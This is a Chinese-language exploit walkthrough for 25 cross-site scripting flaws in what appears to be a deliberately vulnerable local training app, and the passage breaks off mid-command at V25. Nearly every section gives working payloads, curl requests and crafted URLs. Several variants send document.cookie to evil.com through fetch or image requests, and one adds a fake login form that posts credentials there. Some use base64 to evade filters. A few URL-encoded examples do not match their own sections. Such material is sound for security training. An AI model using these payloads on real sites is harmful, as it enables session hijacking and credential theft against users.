# XSS 漏洞利用说明 (Exploits)

本文档提供了 `XSS_VULNERABILITIES.md` 中列出的每个漏洞的具体利用方法。

---

### V1: 反射型XSS - API `data`参数

**前置条件**: 
- 确保后端服务运行在 `http://localhost:3001`
- 环境变量 `VULNERABILITIES_ENABLED=true`

**利用方式**: 
访问以下URL，`data`参数中的脚本将在JSON响应中返回。虽然响应格式为JSON，但如果前端错误地将响应解析为HTML（例如使用`innerHTML`或`eval`），脚本将被执行。

**步骤**:
1. 直接访问URL:
```
http://localhost:3001/api/echo?data=<script>alert('XSS-V1')</script>
```

2. 或者使用curl命令查看响应:
```bash
curl "http://localhost:3001/api/echo?data=<script>alert('XSS-V1')</script>"
```

**预期结果**: 
- JSON响应中包含未转义的`data`参数值
- 如果前端存在漏洞，将响应内容渲染为HTML时会执行脚本

**其他Payload示例**:
- `<img src=x onerror=alert('XSS-V1')>`
- `<svg onload=alert('XSS-V1')>`

**注意事项**: 
- 此漏洞需要前端代码存在漏洞才能实际利用
- 纯JSON响应本身不会执行脚本，需要配合前端漏洞

---


### V2: 存储型XSS - 留言板用户名

**前置条件**: 
- 确保前后端服务正常运行
- 环境变量 `VULNERABILITIES_ENABLED=true`

**利用方式**: 
在留言板页面，将用户名设置为一个XSS Payload。提交后，所有访问该页面的用户都会触发此脚本。

**步骤**:
1. 访问 `http://localhost:3000/guestbook`
2. 在"您的名字"字段输入: `<img src=x onerror=alert('XSS-V2')>`
3. 填写任意留言内容（如"测试留言"）
4. 点击"发表留言"按钮提交

**预期结果**: 
- 留言提交成功
- 刷新页面后，可以看到用户名包含恶意HTML
- 当页面加载时，`alert('XSS-V2')`会被执行
- 所有访问留言板页面的用户都会触发此脚本

**其他Payload示例**:
- `<script>alert('XSS-V2')</script>`
- `<svg onload=alert('XSS-V2')>`
- `<iframe src=javascript:alert('XSS-V2')>`

**注意事项**: 
- 这是存储型XSS，影响范围广
- Payload会被永久存储，直到手动删除
- 建议在测试环境中使用

---


### V3: 存储型XSS - 留言板内容

**前置条件**: 
- 确保前后端服务正常运行
- 环境变量 `VULNERABILITIES_ENABLED=true`

**利用方式**: 
与V2类似，但在留言内容中注入Payload。内容字段通常允许更长的输入，可以构造更复杂的Payload。

**步骤**:
1. 访问 `http://localhost:3000/guestbook`
2. 在"您的名字"字段输入任意用户名（如"测试用户"）
3. 在"留言内容"字段输入: `<script>alert('XSS-V3')</script>`
4. 点击"发表留言"按钮提交

**预期结果**: 
- 留言提交成功
- 刷新页面后，可以看到留言内容包含恶意脚本
- 当页面加载时，`alert('XSS-V3')`会被执行
- 所有访问留言板页面的用户都会触发此脚本

**其他Payload示例**:
- `<img src=x onerror=alert('XSS-V3')>`
- `<svg onload=alert('XSS-V3')>`
- 复杂Payload示例:
```html
<img src=x onerror="
  var img = document.createElement('img');
  img.src = 'http://evil.com/steal?cookie=' + document.cookie;
">
```

**注意事项**: 
- 内容字段可以包含更长的Payload，适合注入复杂的恶意代码
- 这是存储型XSS，影响持久

---


### V4: 存储型XSS - 留言板用户名 (属性注入)

**前置条件**: 
- 确保前后端服务正常运行
- 环境变量 `VULNERABILITIES_ENABLED=true`

**利用方式**: 
注入一个可以中断现有HTML属性并创建新事件处理程序的Payload。用户名被同时用于`data-username`属性和HTML内容渲染。

**步骤**:
1. 访问 `http://localhost:3000/guestbook`
2. 在"您的名字"字段输入: `"><a onmouseover=alert('XSS-V4')>M</a>`
3. 填写任意留言内容并提交

**预期结果**: 
- 留言提交成功
- 刷新页面后，可以看到用户名旁边有一个"M"链接
- 当鼠标悬停在"M"链接上时，`alert('XSS-V4')`会被执行

**Payload解析**:
- `">` - 闭合`data-username`属性的引号并结束标签
- `<a onmouseover=alert('XSS-V4')>M</a>` - 创建新的链接元素，带`onmouseover`事件处理器

**其他Payload示例**:
- `" onclick=alert('XSS-V4') x="` - 在属性中注入事件处理器
- `"><img src=x onerror=alert('XSS-V4')>` - 闭合属性后注入图片标签

**注意事项**: 
- 需要用户交互（鼠标悬停）才能触发
- 属性注入可以绕过某些简单的HTML过滤机制

---


### V5: 存储型XSS - 留言板用户名 (JS上下文)

**前置条件**: 
- 确保前后端服务正常运行
- 环境变量 `VULNERABILITIES_ENABLED=true`

**利用方式**: 
注入可以逃逸出JavaScript字符串的Payload。用户名被嵌入到JavaScript字符串中（在`alert`函数调用内），需要闭合字符串并执行代码。

**步骤**:
1. 访问 `http://localhost:3000/guestbook`
2. 在"您的名字"字段输入: `';alert('XSS-V5');//`
3. 填写任意留言内容并提交

**预期结果**: 
- 留言提交成功
- 刷新页面后，可以看到用户名包含特殊字符
- 当用户点击该条留言的"举报"按钮时，`alert('XSS-V5')`会被执行

**Payload解析**:
- `';` - 闭合现有的JavaScript字符串（`'正在举报用户: `）
- `alert('XSS-V5');` - 执行恶意代码
- `//` - JavaScript注释符，忽略后续代码（`'`）

**其他Payload示例**:
- `';alert(document.cookie);//` - 窃取Cookie
- `';fetch('http://evil.com/steal?data='+document.cookie);//` - 发送数据到攻击者服务器

**注意事项**: 
- 需要用户交互（点击按钮）才能触发
- 这是JavaScript上下文注入，可以执行任意JavaScript代码

---


### V6: 反射型XSS - 搜索关键词

**前置条件**: 
- 确保前端服务运行在 `http://localhost:3000`

**利用方式**: 
在搜索页面，搜索词被直接渲染在页面上。搜索查询参数`q`通过URL传递，前端使用`dangerouslySetInnerHTML`直接渲染。

**步骤**:
1. **方法一**: 通过搜索框
   - 访问 `http://localhost:3000/search`
   - 在搜索框输入: `<img src=x onerror=alert('XSS-V6')>`
   - 点击搜索按钮

2. **方法二**: 直接访问URL
   ```
   http://localhost:3000/search?q=<img src=x onerror=alert('XSS-V6')>
   ```

**预期结果**: 
- 页面显示搜索结果
- 搜索关键词被渲染为HTML
- 当页面加载时，`alert('XSS-V6')`会被执行

**其他Payload示例**:
- `<script>alert('XSS-V6')</script>`
- `<svg onload=alert('XSS-V6')>`
- `<iframe src=javascript:alert('XSS-V6')>`

**URL编码示例**:
```
http://localhost:3000/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS-V6%27%29%3E
```

**注意事项**: 
- 这是反射型XSS，需要用户访问恶意URL
- 攻击者可以通过钓鱼邮件、社交媒体等方式诱导用户点击

---


### V7: [已修正] 反射型XSS - 搜索词(属性节点)

此漏洞已被React的自动转义机制修复，无法利用。

---


### V8: 反射型XSS - 搜索词 (eval)

**前置条件**: 
- 确保前端服务运行在 `http://localhost:3000`
- **重要**: 必须提供搜索查询参数`q`，否则"运行调试"按钮不会显示

**利用方式**: 
构造一个可以被`eval`执行的JavaScript Payload。搜索查询参数被直接嵌入到`eval()`函数调用中，需要闭合字符串并执行代码。

**步骤**:
1. 访问URL: `http://localhost:3000/search?q=');alert('XSS-V8');('`
   - **注意**: URL中必须包含`q`参数，否则页面只会显示"请输入关键词进行搜索"，不会显示"运行调试"按钮
2. 页面加载后，确认能看到"开发者调试区"和"运行调试"按钮
3. 点击"**运行调试**"按钮

**预期结果**: 
- 页面加载后显示搜索结果
- 可以看到搜索关键词被显示（包含恶意Payload）
- 点击"运行调试"按钮后，`alert('XSS-V8')`会被执行
- 浏览器控制台会显示:
  - `正在执行开发者调试...`
  - `搜索词调试: [Payload内容]`

**Payload解析**:
- `');` - 闭合`eval()`中的字符串（`'搜索词调试: `）
- `alert('XSS-V8');` - 执行恶意代码
- `('` - 重新开始一个字符串，闭合`eval()`调用

**其他Payload示例**:
- `');alert(document.cookie);('` - 窃取Cookie
- `');fetch('http://evil.com/steal?data='+document.cookie);('` - 发送数据到攻击者服务器
- `');eval(atob('YWxlcnQoJ1hTUy1WOCcp'))//` - Base64编码绕过

**故障排除**:
- 如果看不到"运行调试"按钮，请确认URL中包含`q`参数
- 如果按钮无法点击，检查浏览器控制台是否有JavaScript错误
- 按钮使用React的`onClick`事件处理器，确保React已正确加载

**注意事项**: 
- **重要**: 此漏洞需要手动点击"运行调试"按钮才会触发，不会在页面加载时自动执行
- 这是最危险的XSS漏洞类型之一，因为`eval()`可以执行任意JavaScript代码
- 攻击者可能通过社会工程学诱导用户点击按钮
- 按钮只在有搜索查询参数时才显示，这是React的条件渲染逻辑

---


### V9: DOM型XSS - 个人资料 `username`

**前置条件**: 
- 确保前端服务运行在 `http://localhost:3000`

**利用方式**: 
`username`参数通过URL查询参数传递，前端使用原生DOM API的`innerHTML`属性直接设置到页面元素中，可直接插入HTML。

**步骤**:
直接访问URL:
```
http://localhost:3000/profile?username=<img src=x onerror=alert('XSS-V9')>
```

**预期结果**: 
- 页面加载后，欢迎消息区域显示"欢迎回来, [恶意HTML]!"
- 当页面加载时，`alert('XSS-V9')`会被执行

**其他Payload示例**:
- `<script>alert('XSS-V9')</script>`
- `<svg onload=alert('XSS-V9')>`
- `<iframe src=javascript:alert('XSS-V9')>`

**URL编码示例**:
```
http://localhost:3000/profile?username=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS-V9%27%29%3E
```

**注意事项**: 
- 这是DOM型XSS，完全在客户端执行，不经过服务器
- 某些WAF（Web应用防火墙）可能无法检测DOM型XSS
- 攻击者可以通过恶意URL诱导用户访问

---


### V10: DOM型XSS - `redirectUrl` (JS注入)

**前置条件**: 
- 确保前端服务运行在 `http://localhost:3000`

**利用方式**: 
利用`location.href`的JavaScript伪协议。页面从URL hash中读取`redirectUrl`参数，并直接赋值给`window.location.href`。

**步骤**:
直接访问URL:
```
http://localhost:3000/profile#redirectUrl=javascript:alert('XSS-V10')
```

**预期结果**: 
- 页面加载后，等待1秒（`setTimeout`延迟）
- 页面会重定向到`javascript:alert('XSS-V10')`
- `alert('XSS-V10')`会被执行

**其他Payload示例**:
- `javascript:alert(document.cookie)` - 窃取Cookie
- `javascript:fetch('http://evil.com/steal?data='+document.cookie)` - 发送数据到攻击者服务器
- `javascript:eval(atob('YWxlcnQoJ1hTUy1WMTAnKQ=='))` - Base64编码绕过

**URL编码示例**:
```
http://localhost:3000/profile%23redirectUrl=javascript%3Aalert%28%27XSS-V10%27%29
```

**注意事项**: 
- 使用了`setTimeout`延迟1秒，攻击者可以利用这个延迟进行更复杂的攻击
- JavaScript伪协议在现代浏览器中可能受到限制
- 这是URL重定向漏洞与XSS的结合

---


### V11: DOM型XSS - `note` (document.write)

**前置条件**: 
- 确保前端服务运行在 `http://localhost:3000`

**利用方式**: 
`note`参数内容被`document.write()`直接写入页面。`document.write()`会将字符串解析为HTML并完全覆盖当前页面内容。

**步骤**:
1. 访问URL: `http://localhost:3000/profile?note=<script>alert('XSS-V11')</script>`
2. 在页面中找到"页面功能"区域
3. 点击"**打印便签**"按钮

**预期结果**: 
- 点击按钮后，整个页面内容会被覆盖
- `alert('XSS-V11')`会被执行
- 页面显示`note`参数的内容

**其他Payload示例**:
- `<script>alert(document.cookie)</script>` - 窃取Cookie
- `<img src=x onerror=alert('XSS-V11')>` - 使用图片标签
- 伪造登录页面:
```html
<h1>请重新登录</h1>
<form action="http://evil.com/steal" method="post">
  <input name="username" placeholder="用户名">
  <input name="password" type="password" placeholder="密码">
  <button type="submit">登录</button>
</form>
```

**注意事项**: 
- **重要**: 需要用户点击"打印便签"按钮才会触发
- `document.write()`会完全覆盖页面内容，攻击者可以完全控制页面显示
- 攻击者可能通过社会工程学诱导用户点击按钮
- 可以用于伪造登录页面、窃取用户凭证

---


### V12: 存储型XSS - 新闻标题

**前置条件**: 
- 确保后端服务运行在 `http://localhost:3001`
- 环境变量 `VULNERABILITIES_ENABLED=true`

**利用方式**: 
通过API创建一篇新闻，标题包含XSS Payload。标题会被存储到数据库，并在首页和详情页都显示。

**步骤**:
1. 使用curl命令创建新闻:
```bash
curl -X POST http://localhost:3001/api/news \
  -H "Content-Type: application/json" \
  -d '{"title":"<img src=x onerror=alert(\"XSS-V12\")>","content":"这是一篇测试新闻的内容。","author":"测试作者"}'
```

2. 访问首页 `http://localhost:3000/` 或该新闻的详情页

**预期结果**: 
- API返回成功响应，包含新创建的新闻ID
- 访问首页时，可以看到新闻标题包含恶意HTML
- 当页面加载时，`alert('XSS-V12')`会被执行
- 访问新闻详情页时，同样会触发XSS

**其他Payload示例**:
- `<script>alert('XSS-V12')</script>`
- `<svg onload=alert('XSS-V12')>`
- 复杂Payload示例:
```bash
curl -X POST http://localhost:3001/api/news \
  -H "Content-Type: application/json" \
  -d '{"title":"<img src=x onerror=\"var img=document.createElement(\\\"img\\\");img.src=\\\"http://evil.com/steal?cookie=\\\"+document.cookie;document.body.appendChild(img);\">","content":"内容","author":"作者"}'
```

**注意事项**: 
- 这是存储型XSS，影响范围广
- 新闻标题会在首页和详情页都显示，影响所有查看该新闻的用户
- Payload会被永久存储，直到手动删除

---


### V13: DOM型XSS - 新闻列表 `title`

**前置条件**: 
- 确保前端服务运行在 `http://localhost:3000`

**利用方式**: 
`title`参数通过URL查询参数传递，前端使用原生DOM API的`innerHTML`属性动态设置页面标题。

**步骤**:
直接访问URL:
```
http://localhost:3000/?title=<script>alert('XSS-V13')</script>
```

**预期结果**: 
- 页面加载后，页面标题（`<h2>`元素）会被设置为`title`参数的值
- 当页面加载时，`alert('XSS-V13')`会被执行

**其他Payload示例**:
- `<img src=x onerror=alert('XSS-V13')>`
- `<svg onload=alert('XSS-V13')>`
- `<iframe src=javascript:alert('XSS-V13')>`

**URL编码示例**:
```
http://localhost:3000/?title=%3Cscript%3Ealert%28%27XSS-V13%27%29%3C%2Fscript%3E
```

**注意事项**: 
- 这是DOM型XSS，完全在客户端执行，不经过服务器
- 某些WAF可能无法检测DOM型XSS
- 攻击者可以通过恶意URL诱导用户访问

---


### V14: DOM型XSS - 订阅分类过滤器 (eval from hash)

**前置条件**: 
- 确保前端服务运行在 `http://localhost:3000`

**利用方式**: 
hash中的`category`参数被`eval()`函数执行。这是最危险的XSS漏洞类型之一，因为`eval()`可以执行任意JavaScript代码。需要构造能够闭合现有代码结构的Payload。

**步骤**:
直接访问URL:
```
http://localhost:3000/subscriptions#category=');alert('XSS-V14');('
```

**预期结果**: 
- 页面加载后，hash中的`category`参数会被提取
- `eval()`函数会执行注入的代码
- `alert('XSS-V14')`会被执行
- 浏览器控制台会显示"订阅分类: [Payload]"

**Payload解析**:
- `');` - 闭合`eval()`中的字符串（`'订阅分类: `）
- `alert('XSS-V14');` - 执行恶意代码
- `('` - 重新开始一个字符串，闭合`eval()`调用

**其他Payload示例**:
- `');alert(document.cookie);('` - 窃取Cookie
- `');fetch('http://evil.com/steal?data='+document.cookie);('` - 发送数据到攻击者服务器
- `');eval(atob('YWxlcnQoJ1hTUy1WMTQnKQ=='))//` - Base64编码绕过

**URL编码示例**:
```
http://localhost:3000/%23filter=%27%29%3Balert%28%27XSS-V14%27%29%3B%28%27
```

**注意事项**: 
- 这是最危险的XSS漏洞类型之一，`eval()`可以执行任意JavaScript代码
- 攻击者可以完全控制用户浏览器
- hash部分不会发送到服务器，某些安全防护措施可能无法检测

---


### V15: 存储型XSS - 新闻作者 (复合型)

**前置条件**: 
- 确保后端服务运行在 `http://localhost:3001`
- 环境变量 `VULNERABILITIES_ENABLED=true`

**利用方式**: 
作者名字段被同时用于HTML元素的`data-author`属性和`dangerouslySetInnerHTML`内容渲染。这种双重使用增加了攻击面。

**步骤**:
1. 使用curl命令创建新闻:
```bash
curl -X POST http://localhost:3001/api/news \
  -H "Content-Type: application/json" \
  -d '{"title":"测试新闻","content":"这是一篇测试新闻的内容。","author":"<script>alert(\"XSS-V15\")</script>"}'
```

2. 访问首页 `http://localhost:3000/` 或该新闻的详情页

**预期结果**: 
- API返回成功响应
- 访问首页时，可以看到作者名包含恶意脚本
- 当页面加载时，`alert('XSS-V15')`会被执行
- 作者名同时出现在`data-author`属性和HTML内容中

**其他Payload示例**:
- `<img src=x onerror=alert('XSS-V15')>` - 使用图片标签
- `<svg onload=alert('XSS-V15')>` - 使用SVG标签
- 属性注入Payload: `" onclick=alert('XSS-V15') x="` - 尝试在属性中注入

**注意事项**: 
- 这是存储型XSS，影响范围广
- 作者名在两个位置都被使用，攻击者可以选择最适合的注入方式
- Payload会被永久存储，直到手动删除

---


### V16: DOM型XSS - RSS源名称 `setTimeout` 字符串执行

**前置条件**: 
- 确保前端服务运行在 `http://localhost:3000`

**利用方式**: 
`feed`参数作为第一个参数传递给`setTimeout()`函数。当`setTimeout()`的第一个参数是字符串时，它会被当作JavaScript代码执行，这相当于隐式的`eval()`调用。

**步骤**:
直接访问URL:
```
http://localhost:3000/rss?feed=alert('XSS-V16')
```

**预期结果**: 
- 页面加载后，`feed`参数会被提取
- 1秒后（`setTimeout`的延迟时间），`alert('XSS-V16')`会被执行

**其他Payload示例**:
- `alert(document.cookie)` - 窃取Cookie
- `fetch('http://evil.com/steal?data='+document.cookie)` - 发送数据到攻击者服务器
- `eval(atob('YWxlcnQoJ1hTUy1WMTYnKQ=='))` - Base64编码绕过
- 多行代码:
```
alert('XSS-V16');
fetch('http://evil.com/steal?cookie='+document.cookie);
```

**URL编码示例**:
```
http://localhost:3000/profile?delay=alert%28%27XSS-V16%27%29
```

**注意事项**: 
- `setTimeout()`执行字符串代码与`eval()`同样危险
- 由于代码会在1秒后执行，攻击者可以利用这个延迟进行更复杂的攻击
- 可以执行任意JavaScript代码

---


### V17: DOM型XSS - 分享平台动态创建 `script` 标签

**前置条件**: 
- 确保前端服务运行在 `http://localhost:3000`

**利用方式**: 
`platform`参数被用于动态创建的`<script>`标签的内容。攻击者可以直接注入JavaScript代码，脚本会在页面加载时自动执行。

**步骤**:
直接访问URL:
```
http://localhost:3000/share?platform=alert('XSS-V17')
```

**预期结果**: 
- 页面加载后，会动态创建一个`<script>`标签
- `platform`参数的值被设置为脚本内容
- 脚本会被立即执行
- `alert('XSS-V17')`会被执行

**其他Payload示例**:
- `alert(document.cookie)` - 窃取Cookie
- `fetch('http://evil.com/steal?data='+document.cookie)` - 发送数据到攻击者服务器

**注意事项**: 
- 脚本会在页面加载时自动执行，无需用户交互
- 这是非常危险的漏洞，攻击者可以完全控制用户浏览器

---


### V18: 存储型XSS - 反馈邮箱字段

**前置条件**: 
- 确保前后端服务正常运行
- 环境变量 `VULNERABILITIES_ENABLED=true`

**利用方式**: 
提交一个包含XSS Payload的邮箱地址。邮箱字段在提交时未经过滤直接存储，在前端显示时使用`dangerouslySetInnerHTML`直接渲染。

**步骤**:
1. 访问 `http://localhost:3000/feedback`
2. 在"姓名"字段输入任意姓名（如"测试用户"）
3. 在"您的邮箱"字段输入: `<a onmouseover="alert('XSS-V18')">hacker@example.com</a>`
4. 在"反馈内容"字段输入任意内容（如"测试反馈"）
5. 点击"提交反馈"按钮

**预期结果**: 
- 反馈提交成功
- 刷新页面后，在反馈列表中可以看到邮箱字段包含恶意HTML
- 当鼠标悬停在邮箱链接上时，`alert('XSS-V18')`会被执行

**其他Payload示例**:
- `<img src=x onerror=alert('XSS-V18')>` - 使用图片标签，无需用户交互
- `<script>alert('XSS-V18')</script>` - 使用script标签
- `<svg onload=alert('XSS-V18')>` - 使用SVG标签

**注意事项**: 
- 这是一个容易被忽略的漏洞点，因为开发者可能认为邮箱字段不需要特殊处理
- 如果使用`<img>`或`<svg>`标签，无需用户交互即可触发
- 这是存储型XSS，影响持久

---


### V19: 反射型XSS - HTTP响应头注入

**前置条件**: 
- 确保后端服务运行在 `http://localhost:3001`
- 环境变量 `VULNERABILITIES_ENABLED=true`

**利用方式**: 
通过在`msg`参数中注入换行符（`\r\n`，URL编码为`%0d%0a`）来添加一个新的`Content-Type`头，并注入HTML Payload，从而欺骗浏览器将响应解析为HTML。

**步骤**:
直接访问以下URL:
```
http://localhost:3001/api/redirect?url=irrelevant&msg=ignored%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert('XSS-V19')</script>
```

**预期结果**: 
- 浏览器会将响应解析为HTML而不是JSON
- `alert('XSS-V19')`会被执行

**Payload解析**:
- `ignored` - 第一个响应头的值（会被忽略）
- `%0d%0a` - 换行符（`\r\n`），用于开始新行
- `Content-Type:text/html` - 添加新的响应头，将内容类型设置为HTML
- `%0d%0a%0d%0a` - 两个换行符，用于分隔响应头和响应体
- `<script>alert('XSS-V19')</script>` - HTML Payload

**其他Payload示例**:
- 使用curl查看响应头:
```bash
curl -v "http://localhost:3001/api/redirect?url=irrelevant&msg=ignored%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert('XSS-V19')</script>"
```

- 更复杂的Payload:
```
ignored%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<script>alert('XSS-V19')</script>
```

**注意事项**: 
- HTTP响应头注入可以完全控制HTTP响应
- 攻击者可以修改内容类型、添加恶意头部、注入HTML内容等
- 这是非常危险的漏洞，可以绕过许多安全机制
- 某些现代浏览器和框架可能会阻止这种攻击

---


### V20: 反射型XSS - JSONP回调函数

**前置条件**: 
- 确保后端服务运行在 `http://localhost:3001`
- 环境变量 `VULNERABILITIES_ENABLED=true`

**利用方式**: 
控制回调函数的名称，使其包含恶意代码。响应内容类型被设置为`application/javascript`，浏览器会将其作为脚本执行。

**步骤**:
直接访问URL:
```
http://localhost:3001/api/jsonp?callback=<script>alert('XSS-V20')</script>
```

**预期结果**: 
- 浏览器会将响应作为JavaScript脚本执行
- 响应格式为: `<script>alert('XSS-V20')</script>({"message":"success","data":"test"})`
- `alert('XSS-V20')`会被执行

**其他Payload示例**:
- 直接执行代码: `alert('XSS-V20')`
- 窃取Cookie: `alert(document.cookie)`
- 发送数据到攻击者服务器:
```
fetch('http://evil.com/steal?data='+document.cookie)
```

- 使用HTML实体编码:
```
&lt;script&gt;alert('XSS-V20')&lt;/script&gt;
```

**使用HTML页面调用JSONP**:
```html
<!DOCTYPE html>
<html>
<head>
    <title>JSONP Exploit</title>
</head>
<body>
    <script>
        function exploit() {
            alert('XSS-V20');
        }
    </script>
    <script src="http://localhost:3001/api/jsonp?callback=exploit"></script>
</body>
</html>
```

**注意事项**: 
- JSONP回调注入可以执行任意JavaScript代码
- 由于响应被当作脚本执行，即使回调函数名包含HTML标签，也会被浏览器解析为脚本的一部分
- 攻击者可以完全控制用户浏览器
- 现代浏览器可能对JSONP有安全限制

---


### V21: 存储型XSS - 用户Bio字段

**前置条件**: 
- 确保后端服务运行在 `http://localhost:3001`
- 环境变量 `VULNERABILITIES_ENABLED=true`
- 用户ID存在（默认有ID为1、2、3的用户）

**利用方式**: 
通过PUT请求更新用户的个人简介（bio）字段为XSS Payload。虽然当前代码中没有直接渲染bio字段的前端页面，但如果未来添加用户资料页面、用户列表页面等功能，且使用不安全的方式渲染bio字段，则会导致XSS攻击。

**步骤**:
使用curl命令更新用户bio:
```bash
curl -X PUT http://localhost:3001/api/users/1 \
  -H "Content-Type: application/json" \
  -d '{"username":"user123","email":"user@example.com","bio":"<img src=x onerror=alert(\"XSS-V21\")>"}'
```

**预期结果**: 
- API返回成功响应，包含更新后的用户信息
- bio字段包含恶意HTML
- 如果存在渲染bio字段的前端页面，且使用不安全方式（如`dangerouslySetInnerHTML`），则触发XSS

**其他Payload示例**:
- `<script>alert('XSS-V21')</script>`
- `<svg onload=alert('XSS-V21')>`
- 复杂Payload:
```bash
curl -X PUT http://localhost:3001/api/users/1 \
  -H "Content-Type: application/json" \
  -d '{"bio":"<img src=x onerror=\"var img=document.createElement(\\\"img\\\");img.src=\\\"http://evil.com/steal?cookie=\\\"+document.cookie;document.body.appendChild(img);\">"}'
```

**验证数据已存储**:
```bash
curl http://localhost:3001/api/users/1
```

**注意事项**: 
- 这是一个潜在的存储型XSS漏洞
- 虽然当前代码中可能没有直接利用点，但数据已经不安全地存储在系统中
- 一旦添加渲染功能就会立即暴露
- 建议在添加渲染功能前修复此漏洞

---


### V22: 存储型XSS - 新闻评论区

**前置条件**: 
- 确保前后端服务正常运行
- 环境变量 `VULNERABILITIES_ENABLED=true`
- 至少存在一篇新闻（ID为1）

**利用方式**: 
在新闻评论区的"姓名"（author）或"评论内容"（content）字段提交Payload。两个字段都通过`dangerouslySetInnerHTML`直接渲染。

**步骤**:
1. 访问任意新闻详情页，如 `http://localhost:3000/news/1`
2. 滚动到页面底部的评论区
3. **方法一**: 在"姓名"字段注入
   - 在"姓名"字段输入: `<script>alert('XSS-V22-name')</script>`
   - 在"评论内容"字段输入任意内容（如"这是一条测试评论"）
   - 点击"发表评论"按钮

4. **方法二**: 在"评论内容"字段注入
   - 在"姓名"字段输入任意姓名（如"测试用户"）
   - 在"评论内容"字段输入: `<img src=x onerror=alert('XSS-V22-content')>`
   - 点击"发表评论"按钮

**预期结果**: 
- 评论提交成功
- 刷新页面后，可以看到评论包含恶意HTML
- 当页面加载时，相应的`alert()`会被执行
- 所有访问该新闻详情页的用户都会触发此脚本

**其他Payload示例**:
- 姓名字段: `<img src=x onerror=alert('XSS-V22-name')>`
- 内容字段: `<script>alert('XSS-V22-content')</script>`
- 复杂Payload（内容字段）:
```html
<img src=x onerror="
  var img = document.createElement('img');
  img.src = 'http://evil.com/steal?cookie=' + document.cookie;
  document.body.appendChild(img);
">
```

**注意事项**: 
- 评论区是用户交互频繁的区域，影响范围广
- 这是存储型XSS，评论会被永久存储
- 攻击者可以在评论中注入恶意脚本，对所有查看该新闻的用户造成威胁

---


### V23: 存储型XSS - 用户通知

**前置条件**: 
- 确保后端服务运行在 `http://localhost:3001`
- 环境变量 `VULNERABILITIES_ENABLED=true`
- 用户ID存在（默认有ID为1的用户）

**利用方式**: 
通过POST请求创建一个包含恶意脚本的通知。虽然当前代码中没有直接渲染通知的前端页面，但如果未来添加通知中心、通知列表等功能，且使用不安全的方式渲染message字段，则会导致XSS攻击。

**步骤**:
使用curl命令创建通知:
```bash
curl -X POST http://localhost:3001/api/notifications \
  -H "Content-Type: application/json" \
  -d '{"userId": 1, "message": "<script>alert(\"XSS-V23\")</script>"}'
```

**预期结果**: 
- API返回成功响应，包含新创建的通知ID
- 通知的message字段包含恶意HTML
- 如果存在渲染通知的前端页面，且使用不安全方式（如`dangerouslySetInnerHTML`），则触发XSS

**其他Payload示例**:
- `<img src=x onerror=alert('XSS-V23')>`
- `<svg onload=alert('XSS-V23')>`
- 复杂Payload:
```bash
curl -X POST http://localhost:3001/api/notifications \
  -H "Content-Type: application/json" \
  -d '{"userId": 1, "message": "<img src=x onerror=\"var img=document.createElement(\\\"img\\\");img.src=\\\"http://evil.com/steal?cookie=\\\"+document.cookie;document.body.appendChild(img);\">", "type": "info"}'
```

**验证通知已创建**:
```bash
curl http://localhost:3001/api/notifications
```

**注意事项**: 
- 这是一个潜在的存储型XSS漏洞
- 通知系统通常用于向用户显示重要信息
- 如果存在XSS漏洞，攻击者可以伪造看似正常的通知，但包含恶意脚本
- 建议在添加渲染功能前修复此漏洞

---


### V24: 反射型XSS - 高级搜索

**前置条件**: 
- 确保后端服务运行在 `http://localhost:3001`
- 环境变量 `VULNERABILITIES_ENABLED=true`

**利用方式**: 
在高级搜索API的任一查询参数（`title`, `author`, `content`等）中注入Payload。这些参数会被直接反射到JSON响应的`searchParams`对象中。

**步骤**:
1. 直接访问URL:
```
http://localhost:3001/api/search/advanced?title=<script>alert("XSS-V24")</script>&author=test
```

2. 或者使用curl命令查看响应:
```bash
curl "http://localhost:3001/api/search/advanced?title=<script>alert(\"XSS-V24\")</script>&author=test"
```

**预期结果**: 
- JSON响应中包含未转义的查询参数
- 响应格式类似:
```json
{
  "message": "success",
  "searchParams": {
    "title": "<script>alert(\"XSS-V24\")</script>",
    "author": "test",
    "content": null,
    "dateFrom": null,
    "dateTo": null
  },
  "results": []
}
```
- 如果前端存在漏洞，将响应内容渲染为HTML时会执行脚本

**其他Payload示例**:
- 在`author`参数中注入:
```
http://localhost:3001/api/search/advanced?title=test&author=<img src=x onerror=alert("XSS-V24")>
```

- 在`content`参数中注入:
```
http://localhost:3001/api/search/advanced?title=test&content=<svg onload=alert("XSS-V24")>
```

- 多个参数同时注入:
```
http://localhost:3001/api/search/advanced?title=<script>alert("XSS-V24-title")</script>&author=<img src=x onerror=alert("XSS-V24-author")>
```

**URL编码示例**:
```
http://localhost:3001/api/search/advanced?title=%3Cscript%3Ealert%28%22XSS-V24%22%29%3C%2Fscript%3E&author=test
```

**注意事项**: 
- 虽然响应格式为JSON，但如果前端错误地将响应解析为HTML，则可能导致XSS攻击
- 高级搜索API通常会被前端调用并显示搜索结果
- 如果前端代码存在漏洞，攻击者可以通过构造恶意搜索参数，在用户浏览器中执行脚本

---


### V25: 存储型XSS - 新闻正文

**前置条件**: 
- 确保后端服务运行在 `http://localhost:3001`
- 环境变量 `VULNERABILITIES_ENABLED=true`

**利用方式**: 
通过API创建一篇新闻，其正文内容（content字段）包含XSS Payload。正文内容会被存储到数据库，并在新闻详情页使用`dangerouslySetInnerHTML`直接渲染。

**步骤**:
1. 使用curl命令创建新闻:
```bash
curl -X POST http://localhost:3001/api/news \
  -H "Content-Type: application/json" \
  -d '{"title":"正常标题","content":"<h1>文章标题</h1><p>这是一个段落。</p><img src=x onerror=alert(\"XSS-V25\")>","author":"作者"}'
```

2. 记录返回的新闻ID（例如: `{"message":"success","data":{"id":6,...}}`）

3. 访问该新闻的详情页，例如: `http://localhost:3000/news/6`

**预期结果**: 
- API返回成功响应，包含新创建的新闻ID
- 访问新闻详情页时，可以看到正文内容包含恶意HTML
- 当页面加载时，`alert('XSS-V25')`会被执行
- 所有访问该新闻详情页的用户都会触发此脚本

**其他Payload示例**:
- 简单Payload:
```bash
curl -X POST http://localhost:3001/api/news \
  -H "Content-Type: application/json" \
  -d '{"title":"正常标题","content":"<script>alert(\"XSS-V25\")</script>","author":"作者"}'
```

- 复杂Payload（包含正常内容和恶意代码）:
```bash
curl -X POST http://localhost:3001/api/news \
  -H "Content-Type: application/json" \
